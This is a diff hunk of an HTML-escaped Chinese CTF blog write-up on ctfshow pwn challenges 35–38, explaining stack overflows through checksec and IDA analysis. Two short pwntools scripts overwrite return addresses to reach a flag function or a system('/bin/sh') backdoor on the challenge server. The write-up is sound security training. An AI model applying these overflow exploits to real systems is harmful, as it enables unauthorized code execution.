@@ -3034,10 +3034,617 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh ctfshow@题目地址 -p题目端口号
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;strong&gt;不是nc连接&lt;/strong&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;**不是nc连接 **&lt;/p&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;专用虚拟机镜像，全套在这里，提取码show&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_035&#34; &gt;PWN_035&lt;/a&gt;&lt;/p&gt;
 &lt;hr&gt;
+&lt;p&gt;checksec一下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/96.png&#34;
+	width=&#34;845&#34;
+	height=&#34;198&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/96_hu_5cec7781a9fafd95.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/96_hu_ceae71005b53e245.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;426&#34;
+		data-flex-basis=&#34;1024px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;没开canary保护，对应了本章主题——栈溢出。&lt;/p&gt;
+&lt;p&gt;IDA分析：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/97.png&#34;
+	width=&#34;1106&#34;
+	height=&#34;726&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/97_hu_8cfcbbb1f6ccb348.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/97_hu_894ff25413a0ac82.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;main函数反编译分析&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;152&#34;
+		data-flex-basis=&#34;365px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;跟进函数：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/98.png&#34;
+	width=&#34;569&#34;
+	height=&#34;200&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/98_hu_7f17590d89865cd7.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/98_hu_492c2c611443a23c.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;sigsegv_handler函数&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;284&#34;
+		data-flex-basis=&#34;682px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/99.png&#34;
+	width=&#34;564&#34;
+	height=&#34;190&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/99_hu_64242a0110d6f688.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/99_hu_f5443b1ee09bc173.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ctfshow函数&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;296&#34;
+		data-flex-basis=&#34;712px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;由此可知：ctfshow函数存在栈溢出漏洞，超过104字节就会发生栈溢出；&lt;/p&gt;
+&lt;p&gt;对于&lt;code&gt;SIGSEGV&lt;/code&gt;函数，当栈溢出触发 SIGSEGV 时，sigsegv_handler 函数会被调用，然后触发函数内部——fprintf打印出flag字符串，也正好对应了fget函数读取的flag值。&lt;/p&gt;
+&lt;blockquote class=&#34;alert alert-warn&#34;&gt;
+    &lt;p&gt;栈溢出会破坏栈上的 “返回地址”“栈帧信息” 或其他关键内存结构，最终引发&lt;strong&gt;非法内存访问&lt;/strong&gt;（比如函数返回时跳转到无效地址），触发 &lt;code&gt;SIGSEGV&lt;/code&gt; 信号。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;所以说我们只要在运行的时候给程序打入超过104个的字符串就好，可以是105个“a”。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/100.png&#34;
+	width=&#34;1235&#34;
+	height=&#34;555&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/100_hu_3fabc6f5bf3328d1.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/100_hu_28f40016a971c608.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;222&#34;
+		data-flex-basis=&#34;534px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;binsh地址的跳转利用&#34;&gt;&lt;strong&gt;/bin/sh地址的跳转利用&lt;/strong&gt;
+&lt;/h3&gt;&lt;p&gt;相较于32位程序，64 位程序调用函数需满足 &lt;strong&gt;栈对齐&lt;/strong&gt;，因此构造 payload 时需注意：&lt;/p&gt;
+&lt;p&gt;在实际解题中，&lt;code&gt;ret&lt;/code&gt; 地址需要针对当前题目动态获取，用 &lt;code&gt;ROPgadget&lt;/code&gt; 工具直接搜索程序中的 &lt;code&gt;ret&lt;/code&gt; 指令（最常用）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary ./pwn &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep ret
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;pwn_036&#34;&gt;PWN_036
+&lt;/h3&gt;&lt;p&gt;题目：存在后门函数，如何利用？ &lt;a class=&#34;link&#34; href=&#34;PWN_036&#34; &gt;PWN_036&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/101.png&#34;
+	width=&#34;826&#34;
+	height=&#34;231&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/101_hu_6afe63e25fe4af19.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/101_hu_ca0bed959ef72a10.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;357&#34;
+		data-flex-basis=&#34;858px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;非常不安全！！！！没有canary保护。可以用ret2shellcode、ret2libc。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/102.png&#34;
+	width=&#34;1225&#34;
+	height=&#34;506&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/102_hu_1ea758b340b9373a.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/102_hu_c4eefe935b6b6cf7.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;main-IDA的分析&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;242&#34;
+		data-flex-basis=&#34;581px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这题开始怪怪的，找不到/bin/sh的后门，sigsegv_handler 函数没有我们想要的flag，不过在左边函数目录看到熟悉的故人——get_flag函数，直接跟进看看：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/103.png&#34;
+	width=&#34;961&#34;
+	height=&#34;289&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/103_hu_ec17c27209d749fe.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/103_hu_ed5b527b98ddfd0f.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;跟进get_flag函数&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;332&#34;
+		data-flex-basis=&#34;798px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到下面的fgets读取和返回的printf(s)打印函数，输出flag字符串，主函数没有引用它啊，怎么办？我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag。（可以用ret2shellcode、ret2libc）&lt;/p&gt;
+&lt;p&gt;main函数的突破点在这：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/104.png&#34;
+	width=&#34;860&#34;
+	height=&#34;215&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/104_hu_5cc36469a1fe2e12.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/104_hu_fcf805775837a51c.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;在main跟进ctfshow函数&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;400&#34;
+		data-flex-basis=&#34;960px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;没开canary保护，s数组可存储大小范围是36，超过了就覆盖返回地址了。&lt;/p&gt;
+&lt;blockquote class=&#34;alert alert-error&#34;&gt;
+    &lt;blockquote&gt;
+&lt;p&gt;gets 读取函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。&lt;/p&gt;
+&lt;p&gt;安全性来看一般都会用fgets函数，搭配&lt;strong&gt;FORTIFY 缓冲区边界检查&lt;/strong&gt;来提高程序自身安全性。&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
+&lt;p&gt;exp：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28297&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;get_flag_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;get_flag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;44&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_flag_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#远程发送&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;#开启shell交互模式（类似终端）&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里的44个‘a’是0x28 + 4 ，0x28（十进制 40）是缓冲区到 ebp（栈基址寄存器）的距离，+4 是覆盖 ebp 本身（32 位程序中寄存器占 4 字节），总共 44 字节后，后续数据才能覆盖函数的 “返回地址”，从而跳转到 get_flag 函数。当然你可以用cyclic(0x28 + 4)，产生44字节的垃圾值。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/105.png&#34;
+	width=&#34;1130&#34;
+	height=&#34;569&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/105_hu_9fe21db2e56fb303.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/105_hu_2f03f58823b9acb.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;198&#34;
+		data-flex-basis=&#34;476px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;pwn_037&#34;&gt;PWN_037
+&lt;/h3&gt;&lt;p&gt;题目：32位的 system(“/bin/sh”) 后门函数给你。 &lt;a class=&#34;link&#34; href=&#34;PWN_037&#34; &gt;PWN_037&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;checksec发现是有无栈溢出保护的，关了canary。&lt;/p&gt;
+&lt;p&gt;IDA分析：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/106.png&#34;
+	width=&#34;649&#34;
+	height=&#34;204&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/106_hu_28baf5c7d68b2e77.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/106_hu_1e83db09825e803f.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;318&#34;
+		data-flex-basis=&#34;763px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以发现main函数没有什么可以利用的，但是在函数目录可以看到有个backdoor的函数有猫腻&amp;hellip;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/107.png&#34;
+	width=&#34;689&#34;
+	height=&#34;309&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/107_hu_82558c987e30e4e0.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;真“后门”函数——backdoor&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;222&#34;
+		data-flex-basis=&#34;535px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这个函数居然有/bin/sh！！！！！&lt;/p&gt;
+&lt;p&gt;跟进ctfshow函数：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/108.png&#34;
+	width=&#34;685&#34;
+	height=&#34;149&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/108_hu_2f6decafcbb4d7a.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/108_hu_13e7ed272ddf4f58.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;459&#34;
+		data-flex-basis=&#34;1103px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;有read读取函数，那我们可以以此为注入点，用垃圾值0x12+4先覆盖函数变量和寄存器ebp本身，然后再上传一个后门函数的地址。&lt;/p&gt;
+&lt;p&gt;exp：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28229&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;backdoor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#后门函数的地址&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/109.png&#34;
+	width=&#34;1043&#34;
+	height=&#34;460&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/109_hu_5594301dde95ce57.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/109_hu_f2393a4d4b100c98.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;226&#34;
+		data-flex-basis=&#34;544px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;脚本exp万岁。&lt;/p&gt;
+&lt;h3 id=&#34;pwn_038&#34;&gt;PWN_038
+&lt;/h3&gt;&lt;p&gt;题目：64位的 system(“/bin/sh”) 后门函数给你。&lt;/p&gt;
+&lt;p&gt;checksec：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/110.png&#34;
+	width=&#34;845&#34;
+	height=&#34;209&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/110_hu_cc699b9c9e84b874.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/110_hu_818237d793c59893.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;404&#34;
+		data-flex-basis=&#34;970px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;没开canary保护，开NX保护（不能ret2shellcode）&lt;/p&gt;
